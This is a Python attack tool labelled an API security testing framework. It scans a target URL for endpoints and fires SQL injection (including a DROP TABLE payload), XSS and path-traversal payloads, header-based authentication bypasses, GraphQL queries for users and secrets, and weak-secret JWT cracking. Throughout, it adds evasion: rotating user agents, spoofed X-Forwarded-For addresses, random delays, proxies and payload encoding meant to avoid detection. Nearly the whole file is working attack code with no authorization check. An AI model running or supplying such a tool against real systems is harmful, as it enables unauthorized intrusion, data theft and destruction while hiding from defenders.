#!/usr/bin/env python3
"""
Enhanced API Security Testing Framework
Supports REST and GraphQL APIs with focus on authentication bypasses,
discovery, and payload testing. Includes OpenAPI/Swagger support.
Now with stealth techniques, advanced testing, and improved evasion.
"""

import requests
import json
import argparse
import sys
import re
from urllib.parse import urljoin, urlparse, quote
import yaml
import random
import string
import concurrent.futures
import time
import hashlib
import hmac
import base64
from typing import Dict, List, Any, Optional, Tuple
from fake_useragent import UserAgent
import threading
from cryptography.fernet import Fernet
import os
import socket
import ipaddress
from datetime import datetime

class StealthRequestSession(requests.Session):
    """Custom session with enhanced stealth capabilities"""
    
    def __init__(self):
        super().__init__()
        self.ua = UserAgent()
        self.request_delay = (0.5, 2.0)  # Random delay between requests
        self.last_request_time = 0
        self.proxies = None
        self.rotate_user_agent()
        
    def rotate_user_agent(self):
        """Rotate to a new random user agent"""
        self.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def request(self, method, url, **kwargs):
        """Override request with stealth features"""
        # Respect rate limiting with random delays
        current_time = time.time()
        elapsed = current_time - self.last_request_time
        min_delay, max_delay = self.request_delay
        
        if elapsed < random.uniform(min_delay, max_delay):
            delay = random.uniform(min_delay, max_delay) - elapsed
            if delay > 0:
                time.sleep(delay)
        
        # Rotate user agent periodically
        if random.random() < 0.2:  # 20% chance to rotate UA per request
            self.rotate_user_agent()
        
        # Add random headers to blend in
        stealth_headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'X-Forwarded-For': self.generate_random_ip(),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        
        headers = kwargs.get('headers', {})
        headers.update(stealth_headers)
        kwargs['headers'] = headers
        
        # Add timeout if not specified
        if 'timeout' not in kwargs:
            kwargs['timeout'] = 15
            
        self.last_request_time = time.time()
        
        try:
            return super().request(method, url, **kwargs)
        except Exception as e:
            print(f"Request failed: {e}")
            # Rotate user agent on failure
            self.rotate_user_agent()
            raise
    
    def generate_random_ip(self):
        """Generate a random IP address for X-Forwarded-For header"""
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

class APISecurityTester:
    def __init__(self, target_url, headers=None, timeout=10, threads=5, stealth_level=2, proxy=None):
        self.target_url = target_url
        self.headers = headers or {}
        self.timeout = timeout
        self.threads = threads
        self.stealth_level = stealth_level  # 0: Normal, 1: Medium, 2: High stealth
        self.session = StealthRequestSession()
        self.session.headers.update(self.headers)
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy,
            }
            
        self.found_endpoints = []
        self.vulnerabilities = []
        self.unique_errors = set()
        self.rate_limit_info = {}
        self.lock = threading.Lock()
        
        # Load payloads from files if available
        self.sql_payloads = self.load_payloads('sql_payloads.txt')
        self.xss_payloads = self.load_payloads('xss_payloads.txt')
        self.path_traversal_payloads = self.load_payloads('path_traversal_payloads.txt')
        self.bypass_payloads = self.load_payloads('bypass_payloads.txt')
        
    def load_payloads(self, filename):
        """Load payloads from file or use defaults"""
        default_payloads = {
            'sql_payloads.txt': [
                "' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users; --",
                "' OR 1=1--", "admin'--", "' OR SLEEP(5)--", "' OR (SELECT COUNT(*) FROM users) > 0--",
                "1' UNION SELECT 1,2,3--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            'xss_payloads.txt': [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                "\"><script>alert('XSS')</script>", "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>", "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\\"
            ],
            'path_traversal_payloads.txt': [
                "../../../../etc/passwd", "....//....//....//etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%255c..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts"
            ],
            'bypass_payloads.txt': [
                "admin", "true", "false", "null", "undefined", "0", "1", 
                "-1", "[]", "{}", "{\"$gt\": \"\"}", "{\"$ne\": null}"
            ]
        }
        
        try:
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return default_payloads.get(filename, [])
        except Exception:
            return default_payloads.get(filename, [])
    
    def test_authentication_bypass(self, endpoint, method="GET"):
        """Test various authentication bypass techniques with stealth"""
        if self.stealth_level > 0:
            print(f"Testing authentication bypass on {endpoint}")
        
        bypass_attempts = [
            # Test without any authentication
            ({}, "No authentication headers"),
            
            # Test with malformed tokens
            ({"Authorization": "Bearer invalid"}, "Invalid token"),
            ({"Authorization": "Bearer " + "A" * 500}, "Overlong token"),
            ({"Authorization": "Bearer null"}, "Null token"),
            ({"Authorization": "Bearer undefined"}, "Undefined token"),
            
            # Test with different auth types
            ({"Authorization": "Basic invalid"}, "Basic auth invalid"),
            ({"Authorization": "Token invalid"}, "Token auth invalid"),
            ({"Authorization": "Bearer "}, "Empty bearer token"),
            
            # Test header removal and alternative headers
            ({"X-Original-URL": endpoint}, "X-Original-URL header"),
            ({"X-Rewrite-URL": endpoint}, "X-Rewrite-URL header"),
            ({"X-Forwarded-For": "127.0.0.1"}, "X-Forwarded-For localhost"),
            ({"X-Forwarded-Host": "localhost"}, "X-Forwarded-Host localhost"),
            
            # Test referer and origin bypasses
            ({"Referer": self.target_url}, "Referer header spoofing"),
            ({"Origin": urlparse(self.target_url).netloc}, "Origin header spoofing"),
            ({"Origin": "null"}, "Null origin header"),
            
            # Test case variation bypasses
            ({"authorization": "Bearer invalid"}, "Lowercase authorization header"),
            ({"AUTHORIZATION": "Bearer invalid"}, "Uppercase authorization header"),
        ]
        
        # Add more bypass attempts based on stealth level
        if self.stealth_level < 2:
            bypass_attempts.extend([
                # More aggressive tests for lower stealth levels
                ({"X-User-Id": "1"}, "X-User-Id injection"),
                ({"X-Admin": "true"}, "X-Admin header"),
                ({"X-Api-Key": "test"}, "X-Api-Key header"),
            ])
        
        for headers, description in bypass_attempts:
            try:
                # Apply stealth techniques
                stealth_headers = self.apply_stealth_techniques(headers.copy())
                
                response = self.session.request(
                    method, 
                    endpoint, 
                    headers=stealth_headers, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                # If we get a successful response where we shouldn't
                if response.status_code < 400 and response.status_code != 304:
                    with self.lock:
                        self.vulnerabilities.append({
                            "type": "Authentication Bypass",
                            "endpoint": endpoint,
                            "technique": description,
                            "status_code": response.status_code,
                            "response_length": len(response.content),
                            "headers": stealth_headers
                        })
                    if self.stealth_level < 2:
                        print(f"  [!] Possible auth bypass: {description}")
                    
            except requests.RequestException as e:
                if self.stealth_level < 1:
                    print(f"  [x] Error testing {description}: {e}")
    
    def apply_stealth_techniques(self, headers):
        """Apply various stealth techniques to headers"""
        if self.stealth_level == 0:
            return headers  # No stealth
            
        # Add common headers to blend in
        common_headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        
        headers.update(common_headers)
        
        # Medium stealth: Add more realistic headers
        if self.stealth_level >= 1:
            headers.update({
                'DNT': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            })
        
        # High stealth: Add even more headers and random values
        if self.stealth_level >= 2:
            headers.update({
                'Sec-CH-UA': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'TE': 'trailers',
            })
            
            # Add some random headers occasionally
            if random.random() < 0.3:
                random_headers = {
                    'X-Request-ID': str(random.randint(100000, 999999)),
                    'X-Correlation-ID': hashlib.md5(str(random.random()).encode()).hexdigest(),
                    'X-CSRF-Token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                }
                headers.update(random_headers)
        
        return headers
    
    def test_graphql_introspection(self):
        """Attempt to query GraphQL introspection with stealth"""
        if self.stealth_level > 0:
            print("Testing GraphQL introspection...")
        
        introspection_queries = [
            # Standard introspection query
            {
                "query": """
                query {
                    __schema {
                        types {
                            name
                            fields {
                                name
                                type {
                                    name
                                    kind
                                    ofType {
                                        name
                                        kind
                                    }
                                }
                            }
                        }
                    }
                }
                """
            },
            # Minimal introspection query
            {
                "query": """
                query {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        subscriptionType { name }
                    }
                }
                """
            },
            # Field introspection with aliases
            {
                "query": """
                query {
                    __type(name: "Query") {
                        name
                        fields {
                            name
                            type {
                                name
                                kind
                            }
                        }
                    }
                }
                """
            }
        ]
        
        for i, query in enumerate(introspection_queries):
            try:
                # Add some random variations to avoid pattern detection
                if random.random() < 0.5:
                    query["variables"] = {}
                if random.random() < 0.3:
                    query["operationName"] = f"IntrospectionQuery_{random.randint(1, 100)}"
                
                response = self.session.post(
                    self.target_url,
                    json=query,
                    timeout=self.timeout
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if "data" in data and "__schema" in data["data"]:
                        with self.lock:
                            self.vulnerabilities.append({
                                "type": "GraphQL Introspection Enabled",
                                "endpoint": self.target_url,
                                "severity": "Medium",
                                "details": "GraphQL introspection is enabled, exposing schema information"
                            })
                        if self.stealth_level < 2:
                            print("  [!] GraphQL introspection is enabled!")
                        break
                    # Check for partial introspection data
                    elif "data" in data and any(key in data["data"] for key in ["__type", "__schema"]):
                        with self.lock:
                            self.vulnerabilities.append({
                                "type": "GraphQL Partial Introspection",
                                "endpoint": self.target_url,
                                "severity": "Low",
                                "details": "Partial GraphQL introspection is enabled"
                            })
                        if self.stealth_level < 2:
                            print("  [!] Partial GraphQL introspection is enabled!")
                        
            except requests.RequestException as e:
                if self.stealth_level < 1 and i == 0:
                    print(f"  [x] Error testing GraphQL introspection: {e}")
    
    def test_graphql_auth_bypass(self):
        """Test GraphQL-specific authentication bypass techniques"""
        if self.stealth_level > 0:
            print("Testing GraphQL authentication bypass...")
        
        # Common GraphQL queries that might bypass auth
        test_queries = [
            {"query": "query { users { id username email } }"},
            {"query": "query { currentUser { id privileges } }"},
            {"query": "mutation { createUser(username: \"test\", password: \"test\") { id } }"},
            {"query": "query { __typename }"},  # Simple query to check if endpoint exists
            {"query": "query { user(id: 1) { id username } }"},
            {"query": "query { admin { settings } }"},
            {"query": "query { config { apiKey secret } }"},
        ]
        
        for query in test_queries:
            try:
                # Add random variations
                if random.random() < 0.4:
                    query["variables"] = {}
                if random.random() < 0.2:
                    query["operationName"] = f"Query_{random.randint(1, 100)}"
                
                response = self.session.post(
                    self.target_url,
                    json=query,
                    timeout=self.timeout
                )
                
                if response.status_code == 200:
                    data = response.json()
                    # Check if we got data without proper authentication
                    if "data" in data and data["data"] is not None:
                        # Check if we got meaningful data (not just null or empty)
                        if data["data"] and any(data["data"].values()):
                            with self.lock:
                                self.vulnerabilities.append({
                                    "type": "GraphQL Auth Bypass",
                                    "endpoint": self.target_url,
                                    "query": query["query"],
                                    "response": data
                                })
                            if self.stealth_level < 2:
                                print(f"  [!] Possible GraphQL auth bypass with query: {query['query']}")
                        
            except requests.RequestException as e:
                if self.stealth_level < 1:
                    print(f"  [x] Error testing GraphQL query: {e}")
    
    def test_sql_injection(self, endpoint, method="GET"):
        """Test for SQL injection vulnerabilities with stealth"""
        if self.stealth_level > 0:
            print(f"Testing SQL injection on {endpoint}")
        
        # Use payloads based on stealth level
        if self.stealth_level >= 2:
            payloads = self.sql_payloads[:3]  # Only use first 3 for high stealth
        else:
            payloads = self.sql_payloads
        
        # Test in different positions (query params, JSON body, headers, etc.)
        tested_params = set()
        
        # Extract parameters from URL
        url_params = self.extract_parameters_from_url(endpoint)
        for param in url_params:
            tested_params.add(param)
            for payload in payloads:
                if self.apply_stealth_to_payload(payload):
                    self.test_sql_payload(endpoint, method, param, payload)
        
        # Test common parameters if not already tested
        common_params = ['id', 'user', 'username', 'email', 'name', 'search', 'q', 'query']
        for param in common_params:
            if param not in tested_params:
                for payload in payloads:
                    if self.apply_stealth_to_payload(payload):
                        self.test_sql_payload(endpoint, method, param, payload)
    
    def apply_stealth_to_payload(self, payload):
        """Apply stealth techniques to payloads"""
        # Skip certain payloads based on stealth level
        if self.stealth_level >= 2 and any(keyword in payload.lower() for keyword in ['drop', 'sleep', 'waitfor', 'shutdown']):
            return False
            
        # Encode payload for higher stealth levels
        if self.stealth_level >= 1:
            # Occasionally encode payloads
            if random.random() < 0.7:
                return quote(payload)
        
        return payload
    
    def test_sql_payload(self, endpoint, method, param, payload):
        """Test a specific SQL payload"""
        try:
            # Test as query parameter
            if method.upper() == "GET":
                test_url = self.add_parameter_to_url(endpoint, param, payload)
                response = self.session.get(test_url, timeout=self.timeout)
            else:
                # For POST, try both form data and JSON
                test_data = {param: payload}
                response = self.session.post(endpoint, data=test_data, timeout=self.timeout)
            
            # Check for potential SQL injection indicators
            error_indicators = [
                "sql", "syntax", "mysql", "ora-", "postgresql", "odbc", "jdbc",
                "driver", "database", "query failed", "sqlite", "mariadb"
            ]
            
            if any(indicator in response.text.lower() for indicator in error_indicators):
                with self.lock:
                    self.vulnerabilities.append({
                        "type": "SQL Injection",
                        "endpoint": endpoint,
                        "parameter": param,
                        "payload": payload,
                        "status_code": response.status_code,
                        "response_snippet": response.text[:200] + "..." if len(response.text) > 200 else response.text
                    })
                if self.stealth_level < 2:
                    print(f"  [!] Possible SQLi in parameter {param} with payload: {payload}")
                    
        except requests.RequestException as e:
            if self.stealth_level < 1:
                print(f"  [x] Error testing SQLi payload {payload}: {e}")
    
    def extract_parameters_from_url(self, url):
        """Extract parameters from URL"""
        params = []
        parsed = urlparse(url)
        
        # Get query parameters
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
        
        # Check for REST-style parameters
        path_parts = parsed.path.split('/')
        for part in path_parts:
            if part.startswith('{') and part.endswith('}'):
                params.append(part[1:-1])
            elif part in ['id', 'user', 'username', 'email', 'name']:
                params.append(part)
                
        return list(set(params))
    
    def add_parameter_to_url(self, url, param, value):
        """Add a parameter to URL"""
        parsed = urlparse(url)
        if parsed.query:
            return f"{url}&{param}={value}"
        else:
            return f"{url}?{param}={value}"
    
    def test_jwt_weaknesses(self, jwt_token):
        """Test JWT tokens for common vulnerabilities"""
        if self.stealth_level > 0:
            print("Testing JWT for weaknesses...")
        
        try:
            # Split JWT into parts
            parts = jwt_token.split('.')
            if len(parts) != 3:
                if self.stealth_level < 1:
                    print("  [x] Invalid JWT format")
                return
            
            header, payload, signature = parts
            
            # Test 1: None algorithm
            try:
                header_decoded = json.loads(base64.urlsafe_b64decode(header + '==').decode())
                
                if header_decoded.get('alg') == 'none':
                    with self.lock:
                        self.vulnerabilities.append({
                            "type": "JWT Algorithm None",
                            "details": "JWT uses 'none' algorithm which can be bypassed"
                        })
                    if self.stealth_level < 2:
                        print("  [!] JWT uses 'none' algorithm - vulnerable!")
            except:
                pass
            
            # Test 2: Weak secret
            weak_secrets = ["secret", "password", "123456", "qwerty", "admin", "token", "jwt", "key"]
            for secret in weak_secrets:
                try:
                    # Re-sign with weak secret
                    new_signature = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), 
                                f"{header}.{payload}".encode(), 
                                hashlib.sha256).digest()
                    ).decode().replace('=', '')
                    
                    if new_signature == signature:
                        with self.lock:
                            self.vulnerabilities.append({
                                "type": "JWT Weak Secret",
                                "secret": secret,
                                "details": "JWT signed with weak secret"
                            })
                        if self.stealth_level < 2:
                            print(f"  [!] JWT signed with weak secret: {secret}")
                        break
                            
                except:
                    continue
            
            # Test 3: No signature verification (empty signature)
            if signature == "":
                with self.lock:
                    self.vulnerabilities.append({
                        "type": "JWT Empty Signature",
                        "details": "JWT has empty signature, indicating no signature verification"
                    })
                if self.stealth_level < 2:
                    print("  [!] JWT has empty signature - no verification!")
                    
        except Exception as e:
            if self.stealth_level < 1:
                print(f"  [x] Error testing JWT: {e}")
    
    def discover_endpoints(self, wordlist=None):
        """Discover API endpoints using common paths and wordlist with stealth"""
        if self.stealth_level > 0:
            print("Discovering endpoints...")
        
        # Common API endpoints
        common_endpoints = [
            "/api", "/graphql", "/v1/api", "/v2/api", "/rest", "/api/users",
            "/api/auth", "/api/login", "/api/admin", "/api/health", "/api/docs",
            "/api/swagger", "/swagger.json", "/swagger.yaml", "/openapi.json",
            "/api/openapi", "/graphiql", "/playground", "/voyager", "/altair",
            "/v1", "/v2", "/v3", "/webhook", "/webhooks", "/callback", "/oauth",
            "/oauth2", "/token", "/authorize", "/userinfo", "/.well-known/openid-configuration"
        ]
        
        # Add custom wordlist if provided
        if wordlist:
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    custom_endpoints = [line.strip() for line in f.readlines() if line.strip()]
                common_endpoints.extend(custom_endpoints)
            except FileNotFoundError:
                if self.stealth_level < 1:
                    print(f"  [x] Wordlist file {wordlist} not found")
        
        # Remove duplicates and randomize order for stealth
        common_endpoints = list(set(common_endpoints))
        random.shuffle(common_endpoints)
        
        # Use thread pool for faster discovery with controlled parallelism
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for endpoint in common_endpoints:
                futures.append(executor.submit(self.check_endpoint, endpoint))
            
            # Wait for all threads to complete
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    if self.stealth_level < 1:
                        print(f"  [x] Error in endpoint discovery: {e}")
    
    def check_endpoint(self, endpoint):
        """Check a single endpoint"""
        full_url = urljoin(self.target_url, endpoint)
        try:
            response = self.session.get(full_url, timeout=self.timeout)
            if response.status_code < 400 or response.status_code == 403 or response.status_code == 401:
                with self.lock:
                    self.found_endpoints.append({
                        "url": full_url,
                        "status": response.status_code,
                        "length": len(response.content),
                        "title": self.extract_title(response.text)
                    })
                if self.stealth_level < 2:
                    print(f"  [+] Found: {full_url} ({response.status_code})")
                
                # Check if it's a Swagger/OpenAPI endpoint
                if any(indicator in response.text.lower() for indicator in 
                      ["swagger", "openapi", "api-docs"]):
                    if self.stealth_level < 2:
                        print(f"  [!] Swagger/OpenAPI docs found at: {full_url}")
                    self.parse_swagger(full_url)
                    
        except requests.RequestException:
            pass
    
    def extract_title(self, html):
        """Extract title from HTML response"""
        title_match = re.search('<title>(.*?)</title>', html, re.IGNORECASE)
        return title_match.group(1) if title_match else "No title"
    
    def parse_swagger(self, swagger_url):
        """Parse Swagger/OpenAPI documentation to find endpoints"""
        if self.stealth_level > 0:
            print(f"Parsing Swagger/OpenAPI docs from {swagger_url}")
        
        try:
            response = self.session.get(swagger_url, timeout=self.timeout)
            
            # Try to parse as JSON or YAML
            try:
                if swagger_url.endswith(('.yaml', '.yml')):
                    spec = yaml.safe_load(response.text)
                else:
                    spec = response.json()
            except:
                if self.stealth_level < 1:
                    print("  [x] Failed to parse Swagger/OpenAPI spec")
                return
            
            # Extract endpoints from the spec
            if 'paths' in spec:
                for path, methods in spec['paths'].items():
                    for method in methods.keys():
                        if method.upper() in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']:
                            endpoint_url = urljoin(self.target_url, path)
                            with self.lock:
                                self.found_endpoints.append({
                                    "url": endpoint_url,
                                    "method": method.upper(),
                                    "source": "swagger",
                                    "spec": swagger_url
                                })
                            if self.stealth_level < 2:
                                print(f"  [+] From Swagger: {method.upper()} {endpoint_url}")
            
        except requests.RequestException as e:
            if self.stealth_level < 1:
                print(f"  [x] Error fetching Swagger docs: {e}")
    
    def test_all_endpoints(self):
        """Run security tests on all discovered endpoints"""
        if self.stealth_level > 0:
            print(f"Testing {len(self.found_endpoints)} discovered endpoints...")
        
        # Use thread pool for testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for endpoint in self.found_endpoints:
                url = endpoint["url"]
                method = endpoint.get("method", "GET")
                
                # Submit tests to thread pool
                futures.append(executor.submit(self.test_endpoint, url, method))
            
            # Wait for all tests to complete
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    if self.stealth_level < 1:
                        print(f"  [x] Error testing endpoint: {e}")
    
    def test_endpoint(self, url, method):
        """Test a single endpoint for various vulnerabilities"""
        # Test for authentication bypass
        self.test_authentication_bypass(url, method)
        
        # Test for SQL injection if it looks like a parameterized endpoint
        if any(char in url for char in ['?', '=', '&', '{', '}']):
            self.test_sql_injection(url, method)
            
        # Test for other vulnerabilities based on endpoint characteristics
        if any(keyword in url.lower() for keyword in ['auth', 'login', 'token', 'jwt']):
            # Check for JWT tokens in response
            response = self.session.get(url, timeout=self.timeout)
            jwt_tokens = self.find_jwt_tokens(response.text)
            for token in jwt_tokens:
                self.test_jwt_weaknesses(token)
    
    def find_jwt_tokens(self, text):
        """Find JWT tokens in text"""
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'
        return re.findall(jwt_pattern, text)
    
    def test_rate_limit(self, endpoint, method="GET"):
        """Test for rate limiting vulnerabilities"""
        if self.stealth_level > 0:
            print(f"Testing rate limiting on {endpoint}")
        
        # Make rapid requests to test rate limiting
        responses = []
        for i in range(20):
            try:
                response = self.session.request(method, endpoint, timeout=self.timeout)
                responses.append(response.status_code)
                
                # Check if we're being rate limited
                if response.status_code == 429:
                    with self.lock:
                        self.vulnerabilities.append({
                            "type": "Rate Limit Tested",
                            "endpoint": endpoint,
                            "details": f"Rate limiting detected after {i+1} requests",
                            "status_code": response.status_code
                        })
                    if self.stealth_level < 2:
                        print(f"  [!] Rate limiting detected after {i+1} requests")
                    break
                    
            except requests.RequestException as e:
                if self.stealth_level < 1:
                    print(f"  [x] Error in rate limit test: {e}")
                break
        
        # Store rate limit information
        self.rate_limit_info[endpoint] = {
            "requests": len(responses),
            "status_codes": responses
        }
    
    def generate_report(self, output_file="api_security_report.txt"):
        """Generate a comprehensive security report"""
        print("\n" + "="*60)
        print("API SECURITY TESTING REPORT")
        print("="*60)
        
        print(f"\nTarget: {self.target_url}")
        print(f"Test date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Stealth level: {self.stealth_level}")
        print(f"Endpoints discovered: {len(self.found_endpoints)}")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\nVULNERABILITIES FOUND:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n[{i}] {vuln['type']}")
                for key, value in vuln.items():
                    if key != 'type':
                        print(f"  {key}: {value}")
        
        # Save detailed report to file
        with open(output_file, "w", encoding='utf-8') as f:
            f.write("API Security Testing Report\n")
            f.write("="*50 + "\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Test date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Stealth level: {self.stealth_level}\n")
            f.write(f"Endpoints discovered: {len(self.found_endpoints)}\n")
            f.write(f"Vulnerabilities found: {len(self.vulnerabilities)}\n\n")
            
            if self.found_endpoints:
                f.write("DISCOVERED ENDPOINTS:\n")
                for endpoint in self.found_endpoints:
                    f.write(f"  {endpoint.get('method', 'GET')} {endpoint['url']} ({endpoint['status']})\n")
                f.write("\n")
            
            if self.vulnerabilities:
                f.write("VULNERABILITIES:\n")
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    f.write(f"\n[{i}] {vuln['type']}\n")
                    for key, value in vuln.items():
                        if key != 'type':
                            f.write(f"  {key}: {value}\n")
        
        print(f"\nReport saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description="Enhanced API Security Testing Framework")
    parser.add_argument("target", help="Target URL to test")
    parser.add_argument("-w", "--wordlist", help="Wordlist for endpoint discovery")
    parser.add_argument("-H", "--header", action="append", help="Add custom headers")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-T", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("-s", "--stealth", type=int, default=2, choices=[0, 1, 2], 
                       help="Stealth level: 0=Normal, 1=Medium, 2=High")
    parser.add_argument("-x", "--proxy", help="Proxy to use for requests")
    parser.add_argument("-o", "--output", default="api_security_report.txt", help="Output file for report")
    
    args = parser.parse_args()
    
    # Parse headers
    headers = {}
    if args.header:
        for header in args.header:
            if ":" in header:
                key, value = header.split(":", 1)
                headers[key.strip()] = value.strip()
    
    # Create tester instance
    tester = APISecurityTester(
        target_url=args.target,
        headers=headers,
        timeout=args.timeout,
        threads=args.threads,
        stealth_level=args.stealth,
        proxy=args.proxy
    )
    
    print(f"Starting API security testing against {args.target}")
    print(f"Stealth level: {args.stealth}")
    print("="*60)
    
    try:
        # Run tests
        tester.discover_endpoints(args.wordlist)
        tester.test_graphql_introspection()
        tester.test_graphql_auth_bypass()
        tester.test_all_endpoints()
        
        # Test rate limiting on a few key endpoints
        key_endpoints = [endpoint["url"] for endpoint in tester.found_endpoints 
                        if any(kw in endpoint["url"] for kw in ["auth", "login", "api"])][:3]
        for endpoint in key_endpoints:
            tester.test_rate_limit(endpoint)
        
        # Generate report
        tester.generate_report(args.output)
        
    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
        tester.generate_report(args.output)
    except Exception as e:
        print(f"\n[!] Error during testing: {e}")
        tester.generate_report(args.output)

if __name__ == "__main__":
    main()
